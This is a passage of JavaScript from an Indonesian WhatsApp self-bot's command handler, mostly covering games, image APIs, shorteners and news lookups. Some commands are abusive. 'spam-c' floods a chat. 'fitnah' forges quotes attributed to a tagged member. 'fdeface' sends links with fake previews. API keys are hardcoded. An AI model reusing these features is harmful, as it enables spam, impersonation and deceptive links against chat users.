const took = body.slice(12)
const nomor = took.split("|")[0]
const nama = took.split("|")[1]
const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	zacky.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, { sendEphemeral: true, thumbnail: fs.readFileSync('./lib/◇.jpeg', 'base64')})
	break
	case 'sendkontag':
	if (!isGroup) return reply(ind.groupo())					
    if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
const pepek = body.slice(12)
const nuahh = pepek.split("|")[0]
const adan = pepek.split("|")[1]
const trot = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + adan + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nuahh + ':+' + nuahh + '\n' + 'END:VCARD'
let taih = await zacky.groupMetadata(from)
	let setan = taih.participants
	let bruy = []
	for (let go of setan){
		bruy.push(go.jid)
	}
	zacky.sendMessage(from, {displayname: adan, vcard: trot}, MessageType.contact, {contextInfo: {"mentionedJid": bruy, sendEphemeral: true, thumbnail: fs.readFileSync('./lib/◇.jpeg', 'base64')}})
	break
	case 'notif':
if (!isGroup) return reply('Gc Only')
teks = `Notif dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
group = await zacky.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
  jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
  text: teks,
  contextInfo: {
mentionedJid: jids
  },
  quoted: freply
}
await zacky.sendMessage(from, options, text)
break
case 'upswtext':
					zacky.updatePresence(from, Presence.composing)
					zacky.sendMessage('status@broadcast', `${q}`, extendedText)
					zacky.sendMessage(from, `Sukses Up story wea teks ${q}`, text,{quoted : freply})
					break
					
				case 'upswimg':
					zacky.updatePresence(from, Presence.composing)
					if (isQuotedImage) {
						const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						cihcih = await zacky.downloadMediaMessage(swsw)
						zacky.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Image dengan Caption: ${q}`
					zacky.sendMessage(from, bur, text, { quoted: mek })
					break
					
				case 'upswvideo':
					zacky.updatePresence(from, Presence.composing)
					if (isQuotedVideo) {
						const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						cihcih = await zacky.downloadMediaMessage(swsw)
						zacky.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Video dengan Caption: ${q}`
					zacky.sendMessage(from, bur, text, { quoted: mek })
					break
                case 'setnamebot':
                case 'namabot':
                if (!isOwner) return reply(ind.ownerb()) //owner only
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                zacky.updateProfileName(anu)
                zacky.sendMessage(from, 'Sukses,nama diubah menjadi '+args.join(' '), text)
				break
			case 'setbio':
			if (!isOwner) return reply(ind.ownerb())
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					zacky.setStatus(`${iyek}`)
					zacky.sendMessage(from, 'Sukses,bio diubah menjadi '+args.join(' '), text)
					break
			case 'fdeface': 
			case 'hack':
			if (!isOwner) return reply(ind.ownerb()) //owner only
				if (!arg) return reply(from, `Penggunaaan ${prefix}fdeface url|title|desc|url\n\nContoh : ${prefix}fdeface https://google.com|Self Bot|By mekzz|https://mek.com`, mek)
				args = arg.split("|")
				if (!args) return reply(from, `Penggunaaan ${prefix}fdeface url|title|desc|url\n\nContoh : ${prefix}fdeface https://google.com|Self Bot|By mekzz|https://mek.com`, mek)
				if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					let media = await zacky.downloadMediaMessage(encmedia)
					mek.sendFakeThumb(from, args[0], args[1], args[2], args[3], media)
				} else {
					mek.sendFakeThumb(from, args[0], args[1], args[2], args[3])
				}
				break
				    case 'spam-c':
				if (!isOwner) return reply(ind.ownerb()) //owner only
				if (!arg) return reply(from, `Penggunaan ${prefix}spam teks|jumlahspam`, mek)
				args = arg.split("|")
				if (!args) return reply(from, `Penggunaan ${prefix}spam teks|jumlah`, mek)
				if (isNaN(args[1])) return reply(from, `harus berupa angka`, mek)
				for (let i = 0; i < args[1]; i++){
					mek.sendText(from, args[0])
				}
				break
				//SURAT TO MENU
case 'suratto': // Case By M4N1K
                if (!isPrem) return reply('Premium Only')
				if (args.length < 1) return reply(`Ketik ${prefix}suratto No tujuan|Isi surat\nMax 5 Kata`)
				const textp = body.slice(9)
				const noorg2 = textp.split("|")[0]
				const katakita2 = textp.split("|")[1]
				const kataorg2 = `Surat Dari ${sender}`
				try {
				pping = await zacky.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
				pping = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				const mnik = `
╔════ ◤ *SURAT FITUR* ◢
║╔▸
║╠ *From* : ${pushname}
║╠ *Number* : @${sender.split("@")[0]}
║╠ *For* : You
║╚▸
║╔▸   ﹝ *ISI SURAT* ﹞  
║╠ ${katakita2}
║╚▸
║╔▸   ﹝ *BALAS SURAT* ﹞  
║╠ Untuk Membalas Ketik:
║╠ #suratto (No tujuan|Isi Surat)
║╠ Contoh: 
║╠ #suratto 6285737134572|Hai Juga
║╚▸
╚═══ ◤ *${NamaBot}* ◢ `
				zacky.sendMessage(`${noorg2}@s.whatsapp.net`,pping, image , {caption: mnik, quoted: { key: {fromMe:false, participant:`${noorg2}@s.whatsapp.net`},message: { conversation: `${kataorg2}`, contextInfo: {"mentionedJid": [sender]}}}});	
				reply('Surat Sukses Dikirim')
				break
				
case 'slot': //SLOT BY M4N1K
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            const somtoy2 = sotoy1[Math.floor(Math.random() * sotoy1.length)]
            const somtoy3 = sotoy2[Math.floor(Math.random() * sotoy2.length)]
            const somtoy4 = sotoy3[Math.floor(Math.random() * sotoy3.length)]
            zacky.sendMessage(from, `
[ SLOTS ]\n-----------------
${somtoy2}
${somtoy}<=====
${somtoy3}
[ SLOTS ]
Keterangan : Jika anda Mendapatkan 3Buah Sama Berarti Kamu Win
Contoh : ${somtoy4}<=====`, text, { quoted: mek })
            break

case 'tebakgambar2': // case by Radya & Manik
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                    get_result = await fetchJson(`https://videfikri.com/api/tebakgambar/`)
                    result = get_result.result
                    ini_image = result.soal_gbr
                    jawaban = result.jawaban
                    tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    console.log(jawaban)
                    ini_buffer = await getBuffer(ini_image)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek, caption: "Jawab jawab jawabbb" })
                   await sleep(30000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    break
                    case 'dadu':
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
			if (isLimit(sender)) return reply(ind.limitend(pusname))
			ranp = getRandom('.png')
			rano = getRandom('.webp')
		        random = `${Math.floor(Math.random() * 6)}`
                    hasil = 'https://www.random.org/dice/dice' + random + '.png'
			exec(`wget ${hasil} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			fs.unlinkSync(ranp)
			if (err) return reply(ind.wait())
			buffer = fs.readFileSync(rano)
			zacky.sendMessage(from, buffer, sticker)
			fs.unlinkSync(rano)
			})
			break
case 'shortlink':
// Fix Bug By Manik				
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				zacky.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://tobz-api.herokuapp.com/api/bitly?url=${args[0]}&apikey=BotWeA`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink2':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				zacky.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://hujanapi.herokuapp.com/api/cuttly?url=${args[0]}&apikey=trial2k21`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.Short}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink3':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				zacky.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://hujanapi.herokuapp.com/api/shorturl?url=${args[0]}&apikey=trial2k21`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.Short}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink4':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				zacky.updatePresence(from, Presence.composing) 
				data = await fetchJson(`http://lolhuman.herokuapp.com/api/shortlink2?url=${args[0]}&apikey=${lolkey}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink5':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				zacky.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://onlydevcity.herokuapp.com/api/short/vgd?url=${args[0]}&apikey=${onlydev}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.link}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink6':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				zacky.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://onlydevcity.herokuapp.com/api/short/isgd?url=${args[0]}&apikey=${onlydev}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.link}`
				reply(hasil)
				await limitAdd(sender)
				break
case 'fitnah':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Lu sudah terbenned!')
		if (isLimit(sender)) return reply(ind.limitend(pusname))				
		if (!isGroup) return reply(ind.groupo())                 
				if (args.length < 1) return reply(`Gini kak : ${prefix}fitnah [@tag&pesan&balasanbot]\n\nContoh : ${prefix}fitnah @tagmember&hai&hai juga`)
				var gh = body.slice(8)
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					var replace = gh.split("&")[0];
					var target = gh.split("&")[1];
					var bot = gh.split("&")[2];
					zacky.sendMessage(from, `${bot}`, text, {quoted: { mek: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
					break
case 'grouplist':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
					zacky.updatePresence(from, Presence.composing) 
					teks = `\`\`\`Ini adalah list group ${NamaBot} :\n\n\`\`\``
					no = 0
					for (let hehehe of groupId) {
						no += 1
						teks += `\`\`\`[${no.toString()}]\`\`\` @${hehehe.split('@')[0]}\n`
					}
					teks += `\n\`\`\`Total grup : ${groupId.length}\`\`\``
					zacky.sendMessage(from, teks.trim(), extendedText, {quoted: mek})
					break
case 'asupan':
		
				axios.get(`https://onlydevcity.herokuapp.com/api/asupan?apikey=onlygay`)
				.then((res) => zacky.sendMessage(from, res.data.result.url))
				.catch((err) => {
					console.log(err)
					reply(from, mess.error.api, mek)
				})
				break
     case 'amel':
       
				axios.get(`https://onlydevcity.herokuapp.com/api/asupanamel?apikey=onlygay`)
				.then((res) => zacky.sendMessage(from, res.data.result.url))
				.catch((err) => {
					console.log(err)
					reply(from, mess.error.api, mek)
				})
				break  
				case 'una':
				
				axios.get(`https://onlydevcity.herokuapp.com/api/asupanuna?apikey=onlygay`)
				.then((res) => zacky.sendMessage(from, res.data.result.url))
				.catch((err) => {
					console.log(err)
					reply(from, mess.error.api, mek)
				})
				break
case 'skeleton':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply(ind.wrongf())
					aruga = body.slice(10)
					reply(ind.wait())
					aruga = await getBuffer(`https://api.xteam.xyz/textpro/skeleton?text=${aruga}&APIKEY=${xteamkey}`)
					zacky.sendMessage(from, aruga, image, {quoted: ftoko})
					await limitAdd(sender)
					break 
					case 'avatarhacker':
                    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(14)
					reply(ind.wait())
					anu = await getBuffer(`https://api.vhtear.com/hacker_avatar?text=${txt}&apikey=${vhkey}`, {method: 'get'})
					zacky.sendMessage(from, anu, image, { quoted: mek, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'glowmetallic':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(14)
					reply(ind.wait())
					anu = await getBuffer(`https://api.vhtear.com/glow_metallic?text=${txt}&apikey=${vhkey}`)
					zacky.sendMessage(from, anu, image, { quoted: mek, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'viettel':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(9)
					reply(ind.wait())
					anu = await getBuffer(`https://api.vhtear.com/viettel_text?text=${txt}&apikey=${vhkey}`)
					zacky.sendMessage(from, anu, image, { quoted: mek, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'matrick':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(9)
					reply(ind.wait())
					anu = await getBuffer(`https://api.vhtear.com/matrix_text?text=${txt}&apikey=${vhkey}`)
					zacky.sendMessage(from, anu, image, { quoted: mek, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'girlgrafity':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(12)
					txt1 = txt.split("|")[0];
                    txt2 = txt.split("|")[1];
					reply(ind.wait())
					anu = await getBuffer(`https://api.vhtear.com/girl_graffiti?text1=${txt1}&text2=${txt2}&apikey=${vhkey}`)
					zacky.sendMessage(from, anu, image, { quoted: mek, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
					
					case 'watermaker':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply('Teksnya Mana Kak??')
					txt = body.slice(10)
					reply(ind.wait())
					anu = await getBuffer(`https://api.vhtear.com/water_maker?text=${txt}&apikey=${vhkey}`)
					zacky.sendMessage(from, anu, image, { quoted: mek, caption: 'Nih Hasilnyaaa' })
					await limitAdd(sender)
					break
// Encrypt Fiture
				case 'base64enc': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: Manik`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b64enc?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result)
					break
					case 'base64dec': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: Manik`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b64dec?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result)
					break
					case 'base32enc': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: Manik`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b32enc?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result)
					break
					case 'base32dec': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: Manik`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b32dec?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result)
					break
					case 'sha1enc': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: Manik`)
					gatauda = body.slice(9)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/sha1?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result.encrypt)
					break
					case 'sha256enc': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: Manik`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/sha256?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result.encrypt)
					break
					case 'sha512enc': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply(`Contoh: Manik`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/sha512?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result.encrypt)
					break
					case 'encbinary':
				encbinary = `${body.slice(11)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/binary/?encode=${encbinary}`, {method: 'get'})
					zacky.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					break  
				case 'decbinary':
				   decbin = `${body.slice(11)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/binary/?decode=${decbin}`, {method: 'get'})
					zacky.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					break
					
                //film menu
                 case 'film': 	
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${body.slice(6)}&apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
				    case 'film2': 	
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${body.slice(6)}&apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
					case 'searchfilm':
               
                pshh = `${body.slice(12)}`
                  anu = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${pshh}&apikey=apivinz`, {method: 'get'})
                  puree = '======================\n'
                  for (let plyll of anu.result){
                  puree += ` *Judul:* ${plyll.title}\n *Link:* ${plyll.url}\n=====================\n`
                  }
                  reply(puree.trim())
                  break
                  case 'filmapikterbaru':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				reply(ind.wait())
				film = await fetchJson(`http://zekais-api.herokuapp.com/filmapiklatest`, {method: 'get'})
				teks = '=================\n'
				for (let i of film.result) {
					teks += `*Nama film* : ${i.name}\n*Quality* : ${i.quality}\n*Rating* : ${i.star}\n*Link* : ${i.url}\n=================\n`
					}
				reply(teks.trim())
				await limitAdd(sender)
				break
				    case 'filmapikdrama':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				reply(ind.wait())
				film = await fetchJson(`http://zekais-api.herokuapp.com/filmapiklatest`, {method: 'get'})
				teks = '=================\n'
				for (let i of film.result) {
					teks += `*Nama film* : ${i.name}\n*Quality* : ${i.quality}\n*Rating* : ${i.star}\n*Link* : ${i.url}\n=================\n`
					}
				reply(teks.trim())
				await limitAdd(sender)
				break
				//leveling
                  case 'mining':
					
                 if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pushname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (!isEventon) return reply(`Maaf ${pushname} event mining tidak di aktifkan oleh owner`)
					if (isOwner | isAdmin | isPremium) {
					const one = Math.ceil(Math.random() * 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
					addLevelingXp(sender, one)
					await reply(`Kamu bagian dari prabayar, aku akan berikan sebanyak *${one}Xp* untuk anda`)
                 					     }else{
					const mining = Math.ceil(Math.random() * 1000000000000000000000000)
					addLevelingXp(sender, mining)
					await reply(`*Selamat* ${pushname} kamu mendapatkan *${mining}Xp*`)
					}
					await limitAdd(sender)
					break
					case 'trendtwit':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isLimit(sender)) return reply(ind.limitend(pusname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
zacky.updatePresence(from, Presence.composing) 
data = await fetchJson(`http://docs-jojo.herokuapp.com/api/trendingtwitter`, {method: 'get'})
teks = '=====================\n'
for (let i of data.result) {
teks += `*Hastag* : ${i.hastag}\n*Peringkat* : ${i.rank}\n*Tweet* : ${i.tweet}\n*Link* : ${i.link}\n=====================\n`
					}
					reply(teks.trim())
					break

case 'cersex':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isLimit(sender)) return reply(ind.limitend(pusname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
reply(ind.wait()) 
anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cersex?apikey=${leyskey}`) 
buffer = await getBuffer(anu.gambar) 
s3x = `*[ CERITA S3X ]*\n\n\nCerita : ${anu.result}`
zacky.sendMessage(from, buffer, image, {quoted: mek, caption: s3x})
break
                
                case 'darkjokes':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				 data = fs.readFileSync('./lib/drak.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 darkjokes = await getBuffer(randKey.result)
                 zacky.sendMessage(from, darkjokes, image, {quoted: mek, caption: '\`\`\`DARK JOKES\`\`\`'})
				break
				

				case 'memeindo': 
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				gatauda = body.slice(8)
				reply(ind.wait())
				anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=apivinz`, {method: 'get'})
				buffer = await getBuffer(anu.result)
				zacky.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
				    case 'tribunews':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/tribunews?apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Time* : ${i.time}\n*Link* : ${i.url}\n*Keterangan* : ${i.ket}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
			    case 'liputan6': 
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/liputan6?apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Url* : ${i.url}\n*Keterangan* : ${i.ket}\n*Category* : ${i.category}\n*Time* : ${i.time}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
				    case 'foxnews': 
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/foxnews?apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Url* : ${i.url}\n*Country* : ${i.country}\n*Content* : ${i.content}\n*Time* : ${i.time}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
				    case 'nickff': 
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=apivinz`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Nick* : ${i}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
				    case 'newsinfo': 
					// Fix Case By Manik
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.updatePresence(from, Presence.composing) 
					data = await fetchJson(`http://lolhuman.herokuapp.com/api/newsinfo?apikey=${lolkey}`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Source:* : ${i.source.name}\n*Author* : ${i.author}\n*Title* : ${i.title}\n*Description* : ${i.description}\n*Url* : ${i.url}\n*Published At* : ${i.publishedAt}\n*Content* : ${i.content}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
					case 'pinterest':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=${body.slice(11)}`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
